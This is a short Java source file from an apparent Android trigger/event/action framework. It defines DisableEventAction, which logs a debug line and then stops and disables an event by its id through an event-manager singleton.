package com.android.dvci.action;

import com.android.dvci.Trigger;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfAction;
import com.android.dvci.manager.ManagerEvent;
import com.android.dvci.util.Check;

public class DisableEventAction extends EventAction {
	private static final String TAG = "DisableEventAction";

	public DisableEventAction(ConfAction params) {
		super(params);
	}

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		
		final ManagerEvent eventManager = ManagerEvent.self();

		eventManager.stop(eventId);
		eventManager.disable(eventId);
		
		return true;
	}

}
